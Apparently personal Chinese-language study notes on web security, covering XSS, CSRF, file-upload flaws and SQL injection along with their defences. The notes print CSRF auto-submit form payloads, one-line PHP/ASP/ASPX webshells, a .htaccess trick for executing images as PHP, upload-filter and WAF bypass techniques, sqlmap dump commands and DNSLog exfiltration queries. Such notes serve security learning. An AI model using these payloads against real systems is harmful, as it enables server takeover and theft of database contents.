# WEB安全專題筆記

# XSS漏洞解析
- XSS(Cross Site Script): 惡意攻擊者利用web頁面的漏洞，插入一些惡意代碼，當用戶訪問網頁的時候，代碼就會執行，這個時候就達到了攻擊的目的。
1. JavaScripts
2. Java
3. VBScript
4. ActiveX
5. Flash

## 討論1: 黑客不用密碼登入您的帳號，如何做到?
- 透過獲取客戶端的cookie內容，達成不須客戶的帳號密碼登入即可登入
### cookie
#### http請求特點
- 請求應答模式
- 靈活可擴展
- 可靠傳輸
- 無狀態
    - 實現: 每個請求都是獨立的
    - 需求: 保持會話

#### cookie內容
- key/value 格式:

#### cookie產生
- 第一次訪問該網頁時，伺服器會確認是否有獲取cookie若沒有伺服器會發送set-cookie給使用者保存在使用者本地，後續訪問該網站時伺服器只需要讀取客戶端的cookie對應內容。

#### cookie格式
- set-cookie :第一次訪問，伺服器響應給客戶端
    - name = value //cookie 的鍵值對 (必須)
    - expires: cookie過期時間
    - max-age: cookie多久過期 (單位:秒)
    - domain: cookie對哪個域名生效
    - path: cookie匹配路徑
    - secure: 只有HTTPS連接，才發送cookie到伺服器
    - httponly: 不允許通過腳本document.cookie去更改值 

- Cookie: 後續的訪問，客戶端發送給伺服器

#### cookie 特點
1. 明文
2. 可修改
3. 大小受限(是瀏覽器而定)

#### cookie用途
1. 記住登入狀態
2. 跟蹤客戶行為

### Session
- 將客戶端的cookie內容保存在伺服器端的session中，並返回一個sessionID的cookie給客戶端，後續訪問時，伺服器透過獲取sessionID的值返回客戶端資料內容

## 討論2: 如何遠程獲取客戶端cookie值?
- 透過網頁輸入執行代碼，讓伺服器執行代碼內容

### JavaScripts語法
- 獲取: document.cookie;
- 設置: document.cookie="key=value";
- 修改: 將原本key的value覆蓋即可修改
- 刪除:

### XSS類型
- 反射型
    1. 攻擊者發送帶有惡意腳本的鏈接
    2. 客戶點擊惡意鏈接訪問伺服器
    3. 伺服器將包含惡意代碼返回用戶瀏覽器
    4. 瀏覽器解析惡意代碼並執行將結果返回攻擊者伺服器
    5. 攻擊者獲取訊息
- 存儲型
    1. 攻擊者通過表單提交惡意代碼，保存在伺服器數據庫內
    2. 用戶正常查詢數據，從數據庫查詢到惡意代碼，返回到用戶瀏覽器
    3. 瀏覽器解析惡意代碼並執行
    4. 攻擊者獲取訊息
- DOM型

### XSS危害
1. 冒充身分
2. 刷點擊
3. 彈廣告
4. 傳播乳蟲病毒

### XSS防止
1. 輸入
    - 正則表達式匹配惡意腳本
        1. 識別惡意腳本，定義惡意腳本的格式
        2. 對腳本的各種變形也要識別
    - 處理:
        - 改成空字符
        - 將匹配字符改掉
2. 輸出
    - 轉譯: 將代碼結構轉成文字顯示 (讓系統不執行代碼內容，只是文字輸出)

3. 利用WAF內的規則碼
    - ModSecurity: 開源WAF

# CSRF漏洞解析
- Cross-Site Reques Forgery(垮站請求偽造): 透過用戶瀏覽攻擊者網站，通過客戶端被調用攻擊者網站的接口訪問第三方網站，藉由用戶本地cookie偽造登入狀態請求其他網站內容(並無直接獲取cookie內容)
## CSRF流程
1. 用戶訪問正常網站獲取cookie
2. 用戶點擊第三方鏈接(廣告鏈接)
3. 攻擊者發送包含惡意請求的網頁
4. 攻擊者利用用戶cookie請求伺服器獲取資料

### CSRF危害
1. 修改帳戶訊息
2. 利用管理員帳號，上傳木馬文件
3. 傳播蠕蟲病毒(點擊、擴散、點擊...)
4. 和其他攻擊手段配合，實現攻擊，比如:XSS

### CSRF攻擊手段-Payload
1. 通過圖片的img scr屬性，自動加載發起get請求
```html
<img src="URL" width="0" height="0"/>
```
2. 建構一個超連結，用戶點擊以後，發起GET請求
```html
<a href="URL">XXXX </a>
```
3. 建構一個自動提交表單(影藏)，用戶訪問後發起POST請求
```html
<form action="URL" method=POST>
    <input type="hidden" name="xxx" value="xxx" />
    <input type="hidden" name="yyy" value="yyy" />
</form>
<script>document.forms[0].submit();</script>
```

### CSRF防禦
1. 確定接口地址是否CSRF漏洞

2. 攻擊具體操作
- https://www.youtube.com/watch?v=aF7ewM_hiP0&list=PLLoeRTvFkQhs_BFrlc-mlOVp7omTitbWq&index=81

3. 漏洞掃描工具
    - Burp Suite
        1. 抓包獲取 CSRF POC
        2. 將payload儲存並執行
    - Bolt: https://github.com/s0md3v/Bolt.git
        ```cmd
        bolt.py -u target_url
        ```
4. 防禦思路
    1. 區分請求是來自自己的網站前端還是第三方網站
        - HTTP Request Header - Referer: 引用頁、來源頁面
            - 比對Refer是否為空或是自己網站地址
        - Cookie Hashing
            1. 客戶端對cookie計算哈希，一起發送給服務端
            2. 服務端接收到cookie，並計算哈希與收到的哈希比對
            3. 如果匹配，說明是客戶端發起的請求
        - CSRF Token
            1. 用戶使用帳號密碼登入，服務端下發一個隨機的token字段，並且服務端把這個字段保存在服務端的session中
            2. 客戶端把這個token保存起來，放在隱藏字段
            3. 用戶在登入狀態下，在之後訪問的時候，都要攜帶這個token字段
            4. 服務端從session中拿出token值進行比對，如果一致說明請求合法
            5. 用戶退出，session銷毀，token失效
    2. 二次驗證、驗證碼

# 文件上傳漏洞
- 文件上傳漏洞是指用戶上傳了一個可執行腳本文件，而且通過這個腳本文件獲得了執行伺服器命令的能力

## 討論1:網站被掛馬、植黑鏈的原因

### 文件上傳功能
- 甚麼網站有文件上船功能
    1. 客戶頭像、文件上傳
    2. 留言板附加文件
    3. 客服文件上傳
    4. ....

### 一句話木馬
- PHP
```php
<?php @eval($_POST['xxx']);?>
```
- @eval: 把字符串作為Php代碼執行
- 後續只要透過瀏覽器請求
    ```
    xxx=system(cmd);
    ```
    - system(): 系統執行命令

- ASP
```asp
<%eval request("pass")%>
```
- ASPX
```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```

### 工具利用
1. 中國蟻劍:
    - https://github.com/AntSwordProject/AntSword-Loader

## 攻擊利用原理

### 前提
1. 網站上傳功能能正常使用
2. 文件類型允許上傳
3. 上傳路徑可以確定
4. 文件可以被訪問，可以被執行或被包含

### 文件上船漏洞流程
1. 找到上傳位置，如果沒有，想辦法放一個文件上去
2. 嘗試繞過校驗，上傳文件
3. 獲取文件訪問位置
4. 蟻劍連接，管理文件

### 等價擴展名
- asp
    - asa、cer、cdx
- aspx
    - ashx、asmx、ascx
- php
    - php2、php3、php4、php5、phps、phtml
- jsp
    - jspx、jspf

### 思考
- 如果文件不可以被執行呢?(例:上傳為圖片，無法用php執行)
    - .htaccess: Hypertext Access(超文本入口)
        - 功能:
            1. 偽靜態
            2. URL重寫
            3. 404、500....頁面
        - 內文:
        ```
        <FilesMatch "a.jpg">
            SetHandler application/x-httpd-php
        </FilesMatch>
        ```
# SQL注入專題討論 (mySQL)
- OWASP top 10 WEB Application Security Risks

## SQL注入的發生原因與流程
### SQL的類型 - Structured Query Language
- DQL: Query, Select
- DML: Manual, insert update delete
- DDL: Define, create drop alter
- DCL: Control, grant revoke commit rollback
- 函數: 字符串函數、數字函數、日期函數
- 運算符: 算術運算符、 比較運算符、 邏輯運算符、位運算符 

#### 靜態網站並無SQL利用-只討論動態網站才會有SQL注入

### WEB伺服器
#### WEB位置: IP
- IPV4
- IPV6
#### WEB應用程序通訊: 端口port
- FTP: 21
- SSH: 22
- Tomcat: 8080
- MySQL: 3306
- Redis: 6379 
#### 域名 (Domain name)
- 頂級域名: .com .org .net
- 國別域名: .tw .cn .us .jp
- 子域名: map.baidu.com tieba(二級).baidu.com
#### DNS (Domain Name System)

### SQLi原理
- 一般SQL語句 
```SQL
select * from db_name where id='input' 
```
- 原理:將輸入端字串閉合完成一個完整語句
```SQL
select * from db_name where id='-1' union select ........ --+ (後面省略符號)
```
- 藉由SQL注入: 取數據庫名/表名/列名/資料內容

### SQL注入點找尋
- url採集
    - 搜尋引擎: inurl:index.php?id=
- 工具利用
    - sqlmap

### 獲取資料庫數據後思路
- 尋找登入頁 -> 提權
- 密碼解析: 將密文轉換成明文

#### 補充:
- 哈希計算是不可逆的 -> 哈希是摘要計算出來的結果

## SQL注入工具:SQLMAP
- 思路: 是否有一種腳本可以自動化執行SQL注入

### 基本用法
```cmd (kali)
sqlmap -u "target_url?id=1"
```
- windows版本指令: python sqlmap.py sqlmap -u "target_url?id=1"
- -u: 後面接目標URL地址以及參數名
- -tamper "tamper_name": 利用指定腳本嘗試注入
- --dbs: 獲取該主機所有的數據庫
- --dbms=mysql: 指定數據庫類型
- -D "DB_Name": 指定數據庫
- --table: 獲取該數據庫全部的數據表
- -T "Table_Name": 指定數據表
- --col: 顯示所有列
- -C "col_name1, col_name2": 指定列顯示內容
- --dump: 顯示資料內容


## SQL注入常見類型
1. boolean-based blind: 基於Boolean的盲注
    - 適用場景: 沒有數據回顯，條件正確有結果，條件不正確沒結果
    - 利用方式: 透造判斷條件，逐個猜測
2. time-base blind: 基於時間的盲注
    - 適用場景: 沒有數據回顯，條件正確與否都一樣
    - 利用方式: 構造判斷條件，逐個猜測(盲猜)
3. error-base: 基於報錯
    - 適用場景: 沒有數據回顯，條件正確與否結果一樣，sleep沒有區別，但錯誤訊息會打印出來
    - 利用方法: 利用錯誤的語法，把value在前端輸出
4. union query-base: 基於聯合查詢
5. stacked queries: 基於多條SQL語句
6. out-of-band (OOB): 非應用內通信注入，例:DNSLOG
    - DNSLog注入流程:
        1. 把select LOAD_FILE()注入到數據庫
        2. UNC構建DNS伺服器地址，假裝訪問文件產生DNSLog
            ```MySQL
            select load_file('////路徑');
            ```
        3. 把子域名替換成函數或者查詢查詢SQL
            ```MySQL
            select if((select load_file(concat('///', database(),'dns_url'))),1,0);        
            ```
        - 工具利用:
            - 
            
## SQLi預防
1. 字符串過濾
    - 正則匹配關鍵字
    - 字符轉譯
    - 預編譯(需多語言框架有預編譯)
2. 數據庫數據加密
    - 密碼加密轉換，不顯示明文
3. 變量跟語句
4. WAF          
5. 數據庫權限
    - 只能訪問該資料庫，無法訪問系統資料庫

## SQLI繞過
1. 對關鍵字進行不同編碼
    - url編碼
    - Unicode編碼
    - 部分十六進制編碼
    - 其他各類編碼
2. 對關鍵字做大小寫轉換
3. 通過其他語意相同的關鍵字替換
    - and = &&
    - or = ||
    - 等於 = like 或 綜合<與>判斷
    - if(a,b,c) = case when(a) then B else C end
    - substr(str, 1, 1) = substr(str) from 1 to 1
    - ....
4. 配合windows特性:
    - whoami = ((((wh^o^am""i))))   //利用符號分割字符執行whoami
    - 利用變量關鍵字執行
    - ....
5. 配合Linux特性:
6. 配合MySQL特性:
7. 配合過濾代碼或漏洞本身
8. HTTP協議繞過:
9. 網路結構繞過:
10. SQLMAP Tamper